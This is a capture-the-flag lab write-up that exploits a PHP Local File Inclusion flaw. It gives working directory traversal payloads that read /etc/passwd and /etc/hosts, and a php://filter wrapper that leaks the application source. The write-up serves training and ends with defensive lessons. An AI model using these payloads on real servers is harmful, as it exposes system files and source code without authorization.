# **Include Me**

**Date: 5/6/2026**  
**Platform: HackerDNA**  
**URL:** [https://hackerdna.com/labs/include-me](https://hackerdna.com/labs/include-me) 

## **Objective**

**Exploit a vulnerable PHP file inclusion parameter to perform Local File Inclusion (LFI) and retrieve the hidden flag from the server.** 

---

## **Step 1: Initial Reconnaissance** 

Navigated to the target: 

[**http://52.208.124.52**](http://52.208.124.52)

The application displayed a simple company-style website with no obvious functionality or input fields:  
![][image1]

However, the URL contained an interesting parameter:   
[**http://52.208.124.52/index.php?page=about.html**](http://52.208.124.52/index.php?page=about.html)

**Analysis:**  
The **page=** parameter strongly suggested the application dynamically included files using PHP.  
This is a classic indicator of a potential Local File Inclusion (LFI) vulnerability.  
A common vulnerable implementation looks like:

**include($\_GET\["page"\]);**

---

## **Step 2: Testing for Directory Traversal**

Attempted a standard LFI payload: 

**http://[52.208.124.52](http://52.208.124.52)/index.php?page=../../../../etc/passwd**

The application returned contents of **/etc/passwd**: 

**root:x:0:0:root:/root:/bin/bash**  
**www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin**

This confirmed: 

* **Directory traversal works**  
* **Arbitrary local files can be included**  
* **LFI vulnerability exists**

---

## **Step 3: Additional Enumeration**

Tested other common files: 

**index.php?page=../../../../etc/hosts**

Returned: 

**127.0.0.1 localhost**  
**10.0.13.77 ip-10-0-13-77.eu-west-1.compute.internal**

---

### **Web Root Validation** 

**index.php?page=../../../../var/www/html/about.html**

Successfully loaded the ‘About’ page again, confirming: 

**Web root \= /var/www/html**

---

## **Step 4: Reading Application Source Code**  

To inspect the PHP source safely, used PHP stream wrappers: 

**index.php?page=php://filter/convert.base64-encode/resource=index.php**

The response returned a base64-encoded PHP source.  
Decoded locally using:

**echo 'BASE64\_DATA' | base64 \-d**

Decoded source: 

**\<?php**

    **if (\!isset($\_GET\["page"\])) {**  
        **header("Location: index.php?page=about.html");**  
        **die();**  
    **} else {**  
        **include($\_GET\["page"\]);**  
    **}**

---

**Analysis of Source Code:**

The vulnerability was confirmed directly: 

**include($\_GET\["page"\]);**

The application:

* **performed no sanitization**  
* **used no whitelist**  
* **directly included user-controlled input**

This allowed arbitrary local file inclusion.

---

## **Step 5: Locating the Flag** 

Initial attempts targeted common locations (these failed because the traversal depth was insufficient): 

**index.php?page=../../../../root/flag.txt**  
**index.php?page=../../../../var/www/html/flag.txt**  
**index.php?page=../../../../flag.txt**  
---

## **Step 6: Successful Exploitation** 

Expanded traversal depth: 

[**http://3.250.157.94/index.php?page=../../../../../../../flag.txt**](http://3.250.157.94/index.php?page=../../../../../../../flag.txt)

---

## **Result / Flag**

Successfully retrieved the flag from the exposed file.

*(Flag omitted intentionally for integrity of the challenge)*

**Key Takeaways:**  
**1\. User-controlled file inclusion is extremely dangerous.**  
**2\. Directory traversal (../) can escape intended web directories.**  
**3\. Reading /etc/passwd is a classic confirmation step for LFI.**  
**4\. PHP stream wrappers (php://filter) can expose source code safely.**  
**5\. Input validation and whitelisting are critical protections.**

[image1]: <data:image/png;base64,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>